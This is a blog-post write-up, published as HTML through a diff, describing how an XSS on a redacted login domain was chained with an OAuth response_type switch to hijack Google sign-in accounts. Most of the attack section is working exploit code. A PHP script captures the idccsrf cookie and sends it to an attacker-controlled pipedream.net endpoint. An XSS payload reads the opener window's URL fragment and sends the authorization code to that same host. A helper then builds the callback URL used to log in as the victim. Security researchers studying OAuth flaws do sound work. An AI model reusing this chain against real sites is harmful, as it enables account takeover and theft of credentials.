@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Account hijack for anyone using Google sign-in with , due to response-type switch + leaking href to XSS on login.redacted.com | Your awesome title</title>
+<meta name="generator" content="Jekyll v4.3.4" />
+<meta property="og:title" content="Account hijack for anyone using Google sign-in with , due to response-type switch + leaking href to XSS on login.redacted.com" />
+<meta name="author" content="GitHub User" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="My friend @testingforbugs reached to out to me , he had a xss in login.redacted.com and wanted to escalate the xss bug impact, cookies were marked as httponly and the main functionalities of the application were on www.redacted.com so the escalation wasn’t going to be easy here." />
+<meta property="og:description" content="My friend @testingforbugs reached to out to me , he had a xss in login.redacted.com and wanted to escalate the xss bug impact, cookies were marked as httponly and the main functionalities of the application were on www.redacted.com so the escalation wasn’t going to be easy here." />
+<link rel="canonical" href="http://localhost:4000/2023/09/10/Escalating-xss-via-Oauth-Dirty-Dance.html" />
+<meta property="og:url" content="http://localhost:4000/2023/09/10/Escalating-xss-via-Oauth-Dirty-Dance.html" />
+<meta property="og:site_name" content="Your awesome title" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-09-10T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Account hijack for anyone using Google sign-in with , due to response-type switch + leaking href to XSS on login.redacted.com" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"GitHub User"},"dateModified":"2023-09-10T00:00:00+00:00","datePublished":"2023-09-10T00:00:00+00:00","description":"My friend @testingforbugs reached to out to me , he had a xss in login.redacted.com and wanted to escalate the xss bug impact, cookies were marked as httponly and the main functionalities of the application were on www.redacted.com so the escalation wasn’t going to be easy here.","headline":"Account hijack for anyone using Google sign-in with , due to response-type switch + leaking href to XSS on login.redacted.com","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2023/09/10/Escalating-xss-via-Oauth-Dirty-Dance.html"},"url":"http://localhost:4000/2023/09/10/Escalating-xss-via-Oauth-Dirty-Dance.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Your awesome title" />
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">Your awesome title</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Account hijack for anyone using Google sign-in with , due to response-type switch + leaking href to XSS on login.redacted.com</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2023-09-10T00:00:00+00:00" itemprop="datePublished">
+        Sep 10, 2023
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>My friend @testingforbugs reached to out to me , he had a xss in login.redacted.com and wanted to escalate the xss bug impact, cookies were marked as httponly and the main functionalities of the application were on www.redacted.com so the escalation wasn’t going to be easy here.</p>
+
+<p>Although https://login.redacted.com is really a special domain as it’s used for signup/login , oauth ,etc so there must be a way to do something impactful.</p>
+
+<p>During that time, I remembered about Frans Rosen’s research on Oauth https://labs.detectify.com/2022/07/06/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/ eg: where by changing the response_type from code to code,id_token made the OAuth provider return the oauth token,etc in the hash fragment of the url. If the web server isn’t configured to handle /  expects the oauth token in a query param  it might return an error page and the oauth token may be remain as it is in the hash fragment. (Checkout for more ways to fail the oauth flow)</p>
+
+<p>Now all the attacker needs is a way to steal that oauth token , Frans talked in detail about various ways which could be used for this, even disclosed some of his findings publically.</p>
+
+<p>https://hackerone.com/reports/1567186
+https://gitlab.com/gitlab-org/gitlab/-/issues/362394</p>
+
+<p>Please read the blogpost by Frans Rosen before moving on as everything is explained there in very detail.</p>
+
+<hr />
+
+<p>I clicked on the <code class="language-plaintext highlighter-rouge">Sign in With Google</code> button and it redirect me to this url:</p>
+
+<p>https://accounts.google.com/o/oauth2/auth/oauthchooseaccount?response_type=code&amp;client_id=redacted.apps.googleusercontent.com&amp;redirect_uri=https%3A%2F%2Flogin.redacted.com%2Fservices%2Fauthcallback%2Fgoogle&amp;scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email%20https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.profile&amp;state=CAAAAYp-AZqpMDAwMDAwMDAwMDAwMDAwAAAA9A7Smsq1ilccptIRIIzBCN2F6P5AovK47V0DGM22mLSuGzEHuOUy0F4IDVP-KgaLPn_tv2xUnrSWyl46NUDAShQVNysl3bZeZOrFyUU-C0x4DbRnLAPeb7tfpoKlq0V6vJFNPazj6xgsRnKKhVz-WF_i2KRmu9-QueIvAxuLnm8u4c7zsTxGRNMaBgAgr9iHtGJxMsczTGTuRn8lmJaR0jqe_gHo_f_nLbT7arnF59kc&amp;service=lso&amp;o2v=1&amp;flowName=GeneralOAuthFlow</p>
+
+<p>I changed the <code class="language-plaintext highlighter-rouge">response_type</code> to <code class="language-plaintext highlighter-rouge">response_type=code,id_token</code> and now just went with the oauth flow , I was redirected to this page.</p>
+
+<p>https://login.redacted.com/identity/sso/ui/AuthorizationError?ErrorCode=No_Oauth_State&amp;ErrorDescription=State+was+not+sent+back&amp;ProviderId=redacted#state=CAAAAYp-AZqpMDAwMDAwMDAwMDAwMDAwAAAA9A7Smsq1ilccptIRIIzBCN2F6P5AovK47V0DGM22mLSuGzEHuOUy0F4IDVP-KgaLPn_tv2xUnrSWyl46NUDAShQVNysl3bZeZOrFyUU-C0x4DbRnLAPeb7tfpoKlq0V6vJFNPazj6xgsRnKKhVz-WF_i2KRmu9-QueIvAxuLnm8u4c7zsTxGRNMaBgAgr9iHtGJxMsczTGTuRn8lmJaR0jqe_gHo_f_nLbT7arnF59kc&amp;code=4/0Adeu5BUex4YzCBcszdOirTLW_UO0o7O5QXEynHjerek2dUDBLaV2QjPMdkK051x7MOBdzA&amp;scope=email%20profile%20openid%20https://www.googleapis.com/auth/userinfo.email%20https://www.googleapis.com/auth/userinfo.profile&amp;id_token=eyJhbGciOiJSUzI1NiIsImtpZCI6IjgzOGMwNmM2MjA0NmMyZDk000GFmZmUxMzdkZDUzMTAxMjlmNGQ1ZDEiLCJ0eXAiOiJKV1QifQ.xxxxxx.O2OPIsMtZZzUc4v3zHXPBCL5rfjciDfPqQScixbpsSXdEbgsxpxMhcz5M3P01yFaVsAzxyXY2iK9kT6gaul99FmizlBk9tpTfcmHCTSlYKiVz-JTn0LevJHoaRSy8hrH5u5TTLpes3yC2U6pZrdPPQgFZsHFKa8gE2N9-XKK80IKwyftukCjNSNFLhGnJy92h7P4xADUS353R0v8C1WnL8J7Ha7Ic-2lr9xg0AKDoYdTiKqAL7FfSq6rUCDR9pPzmXkud0GA_Ff0h_CuOhD_loXRP8t0F8rsjNdQEHR2RLllmSfZtFS2jjUFr7AAgyZav6fF7Xga_jzNnDyWzriAo4A&amp;authuser=0&amp;prompt=consent&amp;version_info=CmxfU1ZJX0VLU0Vzc2pBbjRFREdCQWlQMDFCUlVSSVpsOXhSRFk0WjJwYWFFUmplamxqUmxOTWVIVjZYeTFtZUZwV2EzQkJhWFZrY0dKd1pIWmFOV2x6WVRocU4yNHlkVGhRYnpGeVZsTkNWUV8</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://login.redacted.com/identity/sso/ui/AuthorizationError?
+ErrorCode=No_Oauth_State
+&amp;ErrorDescription=State+was+not+sent+back
+&amp;ProviderId=redacted
+#state=CAAAAY&amp;code=4/0Ad...&amp;id_token=eyJh..................
+</code></pre></div></div>
+
+<p>From the <code class="language-plaintext highlighter-rouge">ErrorDescription</code> you can see the server was expecting a state parameter to be there in the query param but as the hash fragment is there and is only accessible via client side js , as they are in the hash fragment the error is shown.</p>
+
+<p>Now all we need is a way to steal the hash fragment.
+As our xss is in the same domain, I can easily read it. All I need is to make some relation between the error page containing code in hash and the xss page.</p>
+
+<hr />
+
+<p>I went ahead and created a poc, which first setups the oauth url with the modified response_type , then opens the xss endpoint in a new tab using javascript’s window.open (we will refer to this tab as winB), then using window.location I redirected the current page to the oauth url (we will refer this as winA).</p>
+
+<p>The oauth flow takes place and the user is redirected to this url (in winA tab)</p>
+
+<p>https://login.redacted.com/identity/sso/ui/AuthorizationError?ErrorCode=No_Oauth_State&amp;ErrorDescription=State+was+not+sent+back&amp;ProviderId=redacted#state=CAAAAY&amp;code=4/0Ad…&amp;id_token=eyJh………………</p>
+
+<p>See the origin of winA it’s login.redacted.com and the origin of winB is also login.redacted.com. As both winA and winB are of same origin, we can read the full url of winA tab. Using window.opener.document.location.hash property from the winB tab where we have xss, I can easily get the necessary paramater values eg: code . An attacker can send this to his server and then login into victim’s account by just placing the retrieved state and code parameter value in this callback url:</p>
+
+<p>${state} and ${code} are the place holders.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://login.redacted.com/services/authcallback/google?state=${state}&amp;code=${code}&amp;scope=email+profile+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.profile+openid&amp;authuser=0&amp;prompt=none
+</code></pre></div></div>
+
+<p>Now the attacker just needs to make a request to this url and he will be able to login to victim’s account after following the below steps.</p>
+
+<hr />
+
+<p>I wrote the following php script to do the above steps:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+
+<span class="nv">$url</span> <span class="o">=</span> <span class="s2">"https://login.redacted.com/services/auth/sso/google/"</span><span class="p">;</span>
+
+<span class="nv">$curl</span> <span class="o">=</span> <span class="nb">curl_init</span><span class="p">();</span>
+<span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="no">CURLOPT_URL</span><span class="p">,</span> <span class="nv">$url</span><span class="p">);</span>
+<span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="no">CURLOPT_HEADER</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+<span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="no">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+
+<span class="c1">// The response of this url contains the oauth url in the Location header and the idccsrf cookie from the Set-Cookie header</span>
+<span class="nv">$response</span> <span class="o">=</span> <span class="nb">curl_exec</span><span class="p">(</span><span class="nv">$curl</span><span class="p">);</span> <span class="c1">//[1]</span>
+
+<span class="nv">$header_size</span> <span class="o">=</span> <span class="nb">curl_getinfo</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="no">CURLINFO_HEADER_SIZE</span><span class="p">);</span>
+<span class="nv">$headers</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$response</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$header_size</span><span class="p">);</span>
+<span class="nv">$body</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$response</span><span class="p">,</span> <span class="nv">$header_size</span><span class="p">);</span>
+
+<span class="nb">curl_close</span><span class="p">(</span><span class="nv">$curl</span><span class="p">);</span>
+
+<span class="nv">$headers</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">"</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">,</span> <span class="nv">$headers</span><span class="p">);</span>
+
+<span class="k">foreach</span> <span class="p">(</span><span class="nv">$headers</span> <span class="k">as</span> <span class="nv">$header</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$header</span><span class="p">,</span> <span class="s1">'Location: '</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$location</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$header</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span> <span class="c1">//oauth url is stored here</span>
+    <span class="p">}</span>
+
+    <span class="c1"># get set-cookie</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$header</span><span class="p">,</span> <span class="s1">'Set-Cookie: '</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$cookie</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$header</span><span class="p">,</span> <span class="mi">12</span><span class="p">);</span>  <span class="c1">// idccsrf cookie is stored here</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+
+
+<span class="c1">#send this cookie to attacker controlled server https://en2celr7rewbul.m.pipedream.net/steal?q=</span>
+
+<span class="nv">$attackerDomain</span> <span class="o">=</span> <span class="s2">"https://en2celr7oewbxl.m.pipedream.net/steal?q="</span><span class="p">;</span>
+
+<span class="nv">$curl</span> <span class="o">=</span> <span class="nb">curl_init</span><span class="p">();</span>
+<span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="no">CURLOPT_URL</span><span class="p">,</span> <span class="nv">$attackerDomain</span> <span class="mf">.</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$cookie</span><span class="p">));</span>
+<span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="no">CURLOPT_HEADER</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+<span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$curl</span><span class="p">,</span> <span class="no">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
+
+<span class="nb">curl_exec</span><span class="p">(</span><span class="nv">$curl</span><span class="p">);</span> 
+
+
+
+<span class="c1">#replace the response_type parameter value with code,id_token oauthUrl</span>
+
+<span class="nv">$location</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">'response_type=code'</span><span class="p">,</span> <span class="s1">'response_type=code,id_token'</span><span class="p">,</span> <span class="nv">$location</span><span class="p">);</span> <span class="c1">// [2]</span>
+
+
+<span class="cp">?&gt;</span>
+
+
+<span class="nt">&lt;body&gt;</span>
+    <span class="nt">&lt;script&gt;</span>
+        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Oauth url: </span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$location</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="dl">"</span><span class="p">)</span>
+        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Cookie: </span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$cookie</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="dl">"</span><span class="p">)</span>
+        
+        <span class="c1">// this is the xss payload which we used to steal the authorization code  </span>
+
+        <span class="nx">payload</span> <span class="o">=</span> <span class="s2">`setTimeout(()=&gt;{fetch("</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$attackerDomain</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="s2">"%2Bescape(window.opener.document.location.hash));alert(window.opener.document.location.hash)},9000)`</span>
+
+        <span class="kd">function</span> <span class="nf">startExploit</span><span class="p">(){</span>
+            <span class="c1">// window.open location value, it opens the vulnerable xss endpoint a new window</span>
+
+
+            <span class="nx">win</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="s2">`https://login.redacted.com/xssendpoint?param=shirley')};</span><span class="p">${</span><span class="nx">payload</span><span class="p">}</span><span class="s2">;function%20xyz(){window.parent.postMessage('x`</span><span class="p">);</span>
+            <span class="c1">// wait 5 seconds</span>
+
+            <span class="c1">// This opens the oauth url in the current tab</span>
+
+            <span class="nf">setTimeout</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+                <span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="s2">`</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$location</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="s2">;`</span>
+                
+            <span class="p">},</span> <span class="mi">5000</span><span class="p">);</span>
+
+            <span class="c1">//great now if I run `window.opener` from the xss page I get the whole token and everything</span>
+
+        <span class="p">}</span>
+
+    <span class="nt">&lt;/script&gt;</span>
+
+    <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"#"</span> <span class="na">onclick=</span><span class="s">"startExploit()"</span><span class="nt">&gt;</span>Start Exploit<span class="nt">&lt;/a&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+</code></pre></div></div>
+
+<p>This endpoint was responsible for generating the oauth url:</p>
+
+<p><img src="https://github.com/Sudistark/xss-writeups/assets/31372554/c80c6611-6339-478a-8a2f-8bb2cb4d7d0f" alt="BurpSuiteCommunity_xLyg501nml" /></p>
+
+<p>In the response headers you can see this cookie:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Set-Cookie: idccsrf=-898201194036363428516943317029004569446202656766185;
+</code></pre></div></div>
+
+<p>This cookie is really important , while using the the authorization code the server validates if the user’s cookie <code class="language-plaintext highlighter-rouge">idccsrf</code> matches with the <code class="language-plaintext highlighter-rouge">idccsrf</code> cookie assigned at the time of generating the ouath url.</p>
+
+<p>The above php code does the following thing,makes a request to https://login.redacted.com/services/auth/sso/google/ on line [1], from the header response get the <code class="language-plaintext highlighter-rouge">Location</code> header value and from the <code class="language-plaintext highlighter-rouge">Set-Cookie</code> header get the <code class="language-plaintext highlighter-rouge">idccsrf</code> cookie value.</p>
+
+<p>Then we send the cookie to our logging server so that we can use it later.
+On line [2] we modify the <code class="language-plaintext highlighter-rouge">response_type</code> parameter value to <code class="language-plaintext highlighter-rouge">code,id_token</code>.</p>
+
+<p>After that starts javascript code</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">payload</span> <span class="o">=</span> <span class="s2">`setTimeout(()=&gt;{fetch("&lt;?php echo $attackerDomain; ?&gt;"%2Bescape(window.opener.document.location.hash));alert(window.opener.document.location.hash)},9000)`</span>
+</code></pre></div></div>
+
+<p>This is the xss payload which we will be using , basically it alerts the 
+<code class="language-plaintext highlighter-rouge">window.opener.document.location.hash</code> value after 9sec.</p>
+
+<p>The <code class="language-plaintext highlighter-rouge">startExploit</code> method does the following things which are important for this attack,</p>
+
+<p>This opens the xss endpoint via <code class="language-plaintext highlighter-rouge">window.open</code> refers to this window as winB and the current page as winA (which has all the php code,js code,etc)</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">win</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="s2">`https://login.redacted.com/xssendpoint?param=shirley')};</span><span class="p">${</span><span class="nx">payload</span><span class="p">}</span><span class="s2">;function%20xyz(){window.parent.postMessage('x`</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Then after 5sec , we redirect the winA to the value stored in <code class="language-plaintext highlighter-rouge">$location</code> variable. This variable contains the modified <code class="language-plaintext highlighter-rouge">response_type</code> oauth url.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>           <span class="nf">setTimeout</span><span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span>
+                <span class="nb">window</span><span class="p">.</span><span class="nx">location</span> <span class="o">=</span> <span class="s2">`&lt;?php echo $location; ?&gt;;`</span>
+                
+            <span class="p">},</span> <span class="mi">5000</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Now here’s what will happen, the oauth flow will take place automatically as soon as the url is opened there is no user interaction is involved here where they need to select the google acc, it will automatically sign in the user via their google acc which the victim has previously used.</p>
+
+<p>The winA page url will be like this after the oauth flow is done, a message will be shown on the page that the state param wasn’t provided:</p>
+
+<p>https://login.redacted.com/identity/sso/ui/AuthorizationError?ErrorCode=No_Oauth_State&amp;ErrorDescription=State+was+not+sent+back&amp;ProviderId=redacted#state=CAAAAY&amp;code=4/0Ad…&amp;id_token=eyJh………………</p>
+
+<p>The code in winB executes after 9sec (this delay is to make sure the oauth flow takes place properly in the winA tab).
+As I already explained winA and winB are of same origin login.redacted.com , we can easily accessed any info for winA window from winB.</p>
+
+<p>winA can be accessed by winB via window.opener property, to get the hash value:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>window.opener.document.location.hash
+</code></pre></div></div>
+
+<p>Now onto the next part, once we have stealed the victims authorization code. The above exploit also sends the authorization code and idcsrf cookie to attacker controlled server.</p>
+
+<p>Copy the fragment part which is also displayed in the alert popup and paste it in the <code class="language-plaintext highlighter-rouge">getToken</code> method like I have done in this</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// taken one arguement from commandline</span>
+
+
+<span class="kd">function</span> <span class="nf">getToken</span><span class="p">(</span><span class="nx">token</span><span class="p">)</span> <span class="p">{</span>
+
+    <span class="c1">//split the params into array</span>
+
+    <span class="kd">var</span> <span class="nx">params</span> <span class="o">=</span> <span class="nx">token</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="dl">'</span><span class="s1">&amp;</span><span class="dl">'</span><span class="p">);</span>
+
+    <span class="c1">//get the value for state param and code param</span>
+
+    <span class="kd">var</span> <span class="nx">state</span> <span class="o">=</span> <span class="nx">params</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nf">split</span><span class="p">(</span><span class="dl">'</span><span class="s1">=</span><span class="dl">'</span><span class="p">)[</span><span class="mi">1</span><span class="p">];</span>
+    <span class="kd">var</span> <span class="nx">code</span> <span class="o">=</span> <span class="nx">params</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nf">split</span><span class="p">(</span><span class="dl">'</span><span class="s1">=</span><span class="dl">'</span><span class="p">)[</span><span class="mi">1</span><span class="p">];</span>
+
+    <span class="c1">//console.log(state)</span>
+    <span class="c1">//console.log(code)</span>
+
+    <span class="nx">url</span> <span class="o">=</span> <span class="s2">`https://login.redacted.com/services/authcallback/google?state=</span><span class="p">${</span><span class="nx">state</span><span class="p">}</span><span class="s2">&amp;code=</span><span class="p">${</span><span class="nx">code</span><span class="p">}</span><span class="s2">&amp;scope=email+profile+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.profile+openid&amp;authuser=0&amp;prompt=none`</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nf">log</span><span class="p">(</span><span class="nx">url</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="dl">'</span><span class="s1">;</span><span class="dl">'</span><span class="p">,</span> <span class="dl">''</span><span class="p">))</span>
+
+
+
+
+<span class="p">}</span>
+
+<span class="c1">//using this we will generate the correct callback url, just paste your input inside it</span>
+
+<span class="nf">getToken</span><span class="p">(</span><span class="dl">"</span><span class="s2">state=CAAAAY&amp;code=4/0AWtgz&amp;scope=email%20profile%20https://www.googleapis.com/auth/userinfo.email%20https://www.googleapis.com/auth/userinfo.profile%20openid&amp;id_token=eyJhb.............&amp;authuser=0&amp;prompt=none</span><span class="dl">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>The above code will give us the url which can be used now to login into the victim’s account.There is just one important thing to take care of which is the <code class="language-plaintext highlighter-rouge">idccsrf</code> token at first I didn;t noticed this cookie parameter and was wondering for so long why I wasn’t able to login to victim’s acc.</p>
+
+<p>So turn on Burp Intercept and load this url in your browser, add this cookie header which has the idcsrf parameter (you can get this from the server logs). Once you do the following now you can succefully logged in to the victim’s account.</p>
+
+  </div><a class="u-url" href="/2023/09/10/Escalating-xss-via-Oauth-Dirty-Dance.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="http://localhost:4000/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+        <ul class="contact-list">
+          <li class="p-name">GitHub User</li>
+          <li><a class="u-email" href="mailto:your-email@domain.com">your-email@domain.com</a></li>
+        </ul>
+      </div>
+      <div class="footer-col">
+        <p>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.
+</p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"></ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
